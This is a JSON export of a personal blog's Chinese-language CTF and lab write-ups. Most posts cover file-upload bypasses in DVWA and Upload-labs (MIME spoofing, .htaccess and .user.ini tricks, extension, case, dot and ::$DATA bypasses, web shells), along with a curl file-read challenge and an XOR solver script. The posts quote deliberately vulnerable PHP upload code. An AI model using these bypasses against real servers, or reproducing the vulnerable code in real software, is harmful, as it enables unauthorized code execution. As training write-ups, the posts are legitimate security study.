{"meta":{"title":"DD's Blog","subtitle":null,"description":null,"author":"DD","url":"https://ddstick.github.io","root":"/"},"pages":[],"posts":[{"title":"BUUCTF-web-Checkln","slug":"BUUCTF-web-Checkln","date":"2019-10-20T00:30:14.000Z","updated":"2019-10-20T07:28:56.649Z","comments":true,"path":"2019/10/20/BUUCTF-web-Checkln/","link":"","permalink":"https://ddstick.github.io/2019/10/20/BUUCTF-web-Checkln/","excerpt":"","text":"打开题目是一个上传页面随便上传一个php文件，发现报错 于是随意改变文件后缀，仍然报错 发现报错信息里提到的是文件内容的&lt;?进行了过滤，但也说明了他是用黑名单过滤文件后缀的因为对&lt;?进行了过滤，所以要绕过可以将php标记格式改为脚本标记格式： 1&lt;script language=php&gt; phpinfo(); &lt;/script&gt; 但是上传后发现又报错 不过其中的信息有些敏感exif_imagetype，判断可能是用了exif_imagetype()函数对文件格式进行了检查 1exif_imagetype() 读取一个图像的第一个字节并检查其签名 可以在内容的开头直接加上图片的标识头：GIF… 成功上传，不过没有办法直接利用于是就想到了.htaccess但是这个方法局限性太大，反正是不成功….（查了之后才知道这是nginx不是apache，难怪…) 后来看大佬的writeup学习了… .user.ini这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了： 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录 ($_SERVER[‘DOCUMENT_ROOT’]所指定的)。如果被执行的 PHP 文件再 web 根目录之外，则之扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置） 实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。 然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。 PHP配置项中有两个比较有意思的项（下图第一、四个）： auto_prepend_file 表示在php程序加载第一个php代码前加载的php文件auto_append_file 是在php代码执行完毕后加载的文件 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。使用方法很简单，直接写在.user.ini中： 再上传一个1.jpg文件 由于同一目录下还有index.php文件，所以我们可以访问他来执行1.jpg的内容 成功 所以再上传文件’cat /flag’即可","categories":[],"tags":[]},{"title":"CRYPTO-base64-异或","slug":"CRYPTO-base64-异或","date":"2019-09-22T01:27:21.000Z","updated":"2019-09-22T02:42:20.922Z","comments":true,"path":"2019/09/22/CRYPTO-base64-异或/","link":"","permalink":"https://ddstick.github.io/2019/09/22/CRYPTO-base64-异或/","excerpt":"","text":"题目给出的解压包里的文本： 第一眼看到就感觉像base64，解码后为 1igq4;441R;1ikR51ibOO0 看到这种格式只想到igq4可能与flag有某种关系但还是毫无思路…于是去找大佬看看这种格式是什么加密，结果查到的是异或运算，但出题人把前面的flag对应的密文给去掉了完整的密文应该为 1EOBD.7igq4;741R;1ikR51ibOO0 最后利用脚本进行解密…. 12345678910111213141516import base64#miwen=base64.b64decode(\"RU9CRC43aWdxNDsxaWtiNTFpYk9PMDs6NDFS\")miwen=\"EOBD.7igq4;741R;1ikR51ibOO0\"mingwen=\"\"for i in range(0,256): sign=True for j in miwen: mingwenint=(ord(j)^i) if mingwenint&gt;32 and mingwenint&lt;128: mingwen+=chr(mingwenint) else: sign=False break if sign: print (mingwen) mingwen=\"\" 得到flag：","categories":[],"tags":[]},{"title":"攻防世界-web-cat","slug":"攻防世界-web-cat","date":"2019-09-18T07:55:19.000Z","updated":"2019-09-20T13:19:55.481Z","comments":true,"path":"2019/09/18/攻防世界-web-cat/","link":"","permalink":"https://ddstick.github.io/2019/09/18/攻防世界-web-cat/","excerpt":"","text":"进入页面看到有个输入框，见提示输入域名baidu.com测试 发现无任何回显，输入127.0.0.1或localhost测试 发现执行成功，执行的是一个ping命令于是就想着可能是命令拼接执行，但是输入任何有关的字符串就会提示invalid url 所以可以想到系统对这些字符串进行了过滤，此外可以看到该题是通过get来传参的于是在?url=这里，我们传递个%79后发现，%79被编码为y 看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考http://www.w3school.com.cn/tags/html_ref_urlencode.html出现报错信息，是一段html代码，将这些代码复制到记事本后改为html文件打开 这是django报错的页面，所以是将输入的参数传到了后端的django服务中进行解析，但django设置了编码为gbk导致错误编码了宽字符（超过了ascii码的范围）而此时想到前面的@字符没有被过滤在比赛原题是有个提示的： 1RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL??? 这是关于php curl的，于是可以找到php curl中关于@的相关知识点 所以我们能够使用@读取文件内容再结合django的报错得知了项目的绝对路径为/opt/api 这里还需要懂得一些django开发的基本知识，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户和密码。除此之外，settings.py还会对项目整体的设置进行定义。 读取settings.py文件，这里需要注意django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面。 同样在使用@读取数据库信息 在报错信息中搜索CTF得到flag。","categories":[],"tags":[]},{"title":"DVMA-File-Upload","slug":"DVMA-File-Upload","date":"2019-09-04T07:49:28.000Z","updated":"2019-09-04T08:24:37.310Z","comments":true,"path":"2019/09/04/DVMA-File-Upload/","link":"","permalink":"https://ddstick.github.io/2019/09/04/DVMA-File-Upload/","excerpt":"","text":"Low:源代码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; //上传文件的路径 $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); //文件路径=上文文件的路径+文件名 // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; 关键函数：1basename(path,suffix)：函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。如果上传成功，则会提示 路径+succesfully uploaded! 如果上传失败，则会提示 Your image was not uploaded。我们可以写一句话木马 1.php ，上传 Medium:源代码： 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 可以看到，服务器对上传文件的大小和类型做了限制。只允许上传小于 100000 字节并且文件type类型是image/jpeg或 image/png 的 方法一：抓包修改文件的type因为这里过滤的是文件的上传类型，而不是文件的后缀名 方法二：00截断在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 先上传一个木马，抓包： 修改后发送： getmuma. php中的空格的16进制为20，需把他改为00 High:源代码： 123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 关键函数：12345strtolower() : 函数把字符串转换为小写。strrpos(string,find,start):函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。getimagesize(string filename) ：函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg”、”.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型 因为上传的文件为图片类型，因此服务器将上传的文件解析成图片文件，所以若向其发送请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，具体文件包含的方法可参考(Upload-labs)https://ddstick.github.io/2019/07/31/Upload-labs/#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC 方法二：采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，且只能在php版本小于5.3.4的服务器中 Impossible源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo \"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;\"; &#125; else &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 关键函数：123456789in_get(varname)：函数返回相应选项的值imagecreatefromjpeg ( filename ) ：函数返回图片文件的图像标识，失败返回falseimagejpeg ( image , filename , quality) ：从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。imagedestroy( img ) ： 函数销毁图像资源getchwd() 函数返回当前工作目录 可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件 web安全之token和CSRF攻击https://blog.csdn.net/qq_15096707/article/details/51307024","categories":[],"tags":[]},{"title":"Upload-labs","slug":"Upload-labs","date":"2019-07-31T00:19:52.000Z","updated":"2019-08-31T06:59:11.497Z","comments":true,"path":"2019/07/31/Upload-labs/","link":"","permalink":"https://ddstick.github.io/2019/07/31/Upload-labs/","excerpt":"","text":"文件上传漏洞练习Upload-labs是一个帮你总结各种类型的上传漏洞的靶场，包括常见的文件上传漏洞项目地址：https://github.com/c0ny1/upload-labs Summary 构造优质上传漏洞Fuzz字典http://www.hacksec.cn/Tools/866.html Pass-01 js检查直接上传php木马，发现前端报错： 在这使用传统的抓包，修改后缀名。是可以上传成功的，但是不是这一关的目的，我们看看源代码分析一波 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，只是在客户端使用js对不合法图片进行检查，我们可以尝试绕过 如果是前端验证我们可以选择火狐浏览器中的NoScript插件禁用js,这样我们就可以安全的上传 但对于前端的过滤没有必要这么复杂，其实，还可以这样，直接把过滤的函数cheakfile()在上传前删掉，也可以上传成功 或者修改参数 在白名单中加上.php 复制该函数于控制台并回车 随后即可成功上传 Pass-02 验证Content-type本题中使用传统的抓包，单纯修改后缀名是不行的查看源码观察一下： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 基础姿势：12345$_FILES[\"file\"][\"name\"] – 被上传文件的名称$_FILES[\"file\"][\"type\"] – 被上传文件的类型$_FILES[\"file\"][\"size\"] – 被上传文件的大小，以字节计$_FILES[\"file\"][\"tmp_name\"] – 存储在服务器的文件的临时副本的名称$_FILES[\"file\"][\"error\"] – 由文件上传导致的错误代码 123456move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。参数 描述file 必需。规定要移动的文件。newloc 必需。规定文件的新位置。如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。 发现只是对文件类型Content-type进行过虑于是上传xxx.php文件抓包修改content-type为image/jpeg或其他绕过 修改为： 点击Forward发送 Pass-03 黑名单绕过不能上传，但能上传 php.jpg，php.asd 说明是黑名单限制 发现是黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件其采用的黑名单，php的话有时候php3、php4、php5、phtml、pht这些后缀也是可以被解析的（配置的原因），其他语言也有类似的情况，需要尝试： 上传木马抓包 修改文件名后缀（配置不同，可解析的后缀也不同）： Pass-04 .htaccess绕过上传.htaccess文件需要：|1.mod_rewrite模块开启|2.AllowOverride All| 该题的源码为： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 发现同样有黑名单过滤，但是发下有一个文件是没有过滤，也是我们上传过程中经常用到的.htaccess .htaccess重点姿势.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。它里面有这样一段代码：AllowOverride None，如果我们把None改成All 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 可以通过上传.htaccess文件然后将该文件夹下的所有例如.jpg的文件都按照脚本语言解析，上传如下内容的.htaccess文件： 意思是将文件夹下的one.jpg文件按照php格式去解析，然后再上传一个文件名为one.jpg内容为木马的文件，然后访问，可以执行代码（其中.jpg也可换成test等其他，但其他也需改变） 或 或 这样所有文件都会解析为php 上传成功后，在上传个图片马： 发现成功上传，可以访问一下，发现成功执行： Pass-05 大小写绕过——Windows拿源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到在第五关代码中没有这个 1$file_ext = strtolower($file_ext); //转换为小写 所以我们可以通过大小写进行绕过了： 抓包： 回显： Pass-06 空格绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这一关比第五关少了这样的一句代码 1$file_ext = trim($file_ext); //首尾去空 所以可以后缀名+空格的形式去绕过,抓包 修改： Pass-07 点绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看代码发现，大小写，空格，等等都是绕不过的，但是还有一个在后缀名中家点号没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，上传后文件名后缀的点会被去除，所以可在后缀名中加”.”绕过，走起： Pass-08 ::$DATA绕过——Windows这一题的代码比上一次少了下面这一段代码 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 这个是关于windows下文件的流特性，可以参考一下这篇文章https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream在后缀添加::$DATA 即可绕过上传1.php::$DATA之后会变成1.php NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 上传xxx.php::$DATA绕过。(仅限windows) Pass-09 点空格点绕过——Windows这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样 1234567$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 可以遵循着他的步骤去实现自己的payload，可以设置为pass09.php. . 这样一来检测到最后的文件名是pass09.php.，这样就相当于第七关了 Pass-10 双写绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 关键函数解析123456str_ireplace(find,replace,string,count)参数 描述find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。一个变量，对替换数进行计数。 上面的代码依旧是黑名单过滤，这里是将文件后缀名替换为空，只替换了一次 1234567&lt;?php$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");$file_name = str_ireplace($deny_ext,\"\", 'pphphp');var_dump($file_name);#绕过测试代码?&gt; 